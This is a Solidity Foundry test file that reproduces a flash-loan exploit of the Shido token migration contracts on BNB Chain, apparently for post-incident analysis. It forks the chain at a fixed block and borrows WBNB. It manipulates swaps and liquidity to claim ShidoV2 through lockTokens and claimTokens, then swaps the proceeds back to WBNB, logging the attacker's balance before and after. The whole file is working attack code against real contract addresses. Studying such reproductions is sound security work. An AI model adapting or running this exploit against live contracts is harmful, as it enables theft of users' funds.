// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

// Phalcon Explorer: https://explorer.phalcon.xyz/tx/bsc/0x72f8dd2bcfe2c9fbf0d933678170417802ac8a0d8995ff9a56bfbabe3aa712d6

contract Shido is Test {
    IERC20 WBNB = IERC20(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IERC20 Shido = IERC20(0x733Af324146DCfe743515D8D77DC25140a07F9e0);
    IERC20 ShidoV2 = IERC20(0xa963eE460Cf4b474c35ded8fFF91c4eC011FB640);
    IDPPOracle DPPAdvanced =
        IDPPOracle(0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d);
    IPancakeRouter Router =
        IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IPancakePair ShidoV2Pair =
        IPancakePair(0x0fb0dA54b6eF183fB4b67BFe01af44e06D576Ef3);
    IPancakePair ShidoPair =
        IPancakePair(0xd0A167d1973cA8f76723C6FEa1E6f608DBC1d464);
    ILiquidity LiquidityContract =
        ILiquidity(0x9869674E80D632F93c338bd398408273D20a6C8e);
    IShidoContract ShidoContract =
        IShidoContract(0xaF0CA21363219C8f3D8050E7B61Bb5f04e02F8D4);

    function setUp() external {
        vm.createSelectFork("https://rpc.ankr.com/bsc", 29365170);
    }

    function testShidoExploit() external {
        console.log(
            "Attacker WBNB Balance at start:",
            WBNB.balanceOf(address(this))
        );
        DPPAdvanced.flashLoan(40e18, 0, address(this), new bytes(1));
        console.log(
            "Attacker WBNB Balance at end:",
            WBNB.balanceOf(address(this))
        );
    }

    function DPPFlashLoanCall(
        address sender,
        uint baseAmount,
        uint quoteAmount,
        bytes calldata data
    ) external {
        WBNB.approve(address(Router), type(uint256).max);
        Shido.approve(address(LiquidityContract), type(uint256).max);
        ShidoV2.approve(address(Router), type(uint256).max);
        Shido.approve(address(ShidoContract), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(Shido);

        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            39e18,
            1,
            path,
            address(LiquidityContract),
            block.timestamp + 1000
        );

        WBNB.withdraw(10000000000000000);

        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            0.1e18,
            20,
            path,
            address(this),
            block.timestamp + 1000
        );

        (
            uint amountToken,
            uint256 amountETH,
            uint256 liquidity
        ) = LiquidityContract.addLiquidityETH{value: 0.01e18}(
                address(Shido),
                1000000000,
                1,
                1,
                payable(address(this)),
                block.timestamp + 1000
            );
        ShidoContract.lockTokens();
        ShidoContract.claimTokens();
        path[0] = address(ShidoV2);
        path[1] = address(WBNB);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            ShidoV2.balanceOf(address(this)),
            500000000000000000000,
            path,
            address(this),
            block.timestamp + 1000
        );
        WBNB.transfer(msg.sender, baseAmount);
    }

    receive() external payable {}
}
